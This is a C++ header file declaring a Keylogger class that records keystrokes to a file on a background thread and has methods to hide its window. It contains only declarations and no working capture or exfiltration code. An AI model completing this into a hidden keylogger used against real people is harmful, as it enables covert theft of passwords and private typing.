#pragma once

#include "keyboard.h"

#include <Windows.h>
#include <fstream>
#include <iostream>
#include <thread>

class Keylogger : public Keyboard {
private:
	std::wofstream file;
	std::thread* keylog;

	HWND handle;
	bool visible;
	void hide();
	void show();

	void setKeysState();
	void translateKeysStates();

	template<typename T >void handleTranslated(const T output);
	template<typename T> void showTranslated(const T output);
	template<typename T> void saveTranslated(const T output);
public:
	Keylogger();

	void startKeylog();
	void stopKeylog();
	bool isKeylogging();

	void listen();
	void toggleWindow();
	void destroyWindow();
};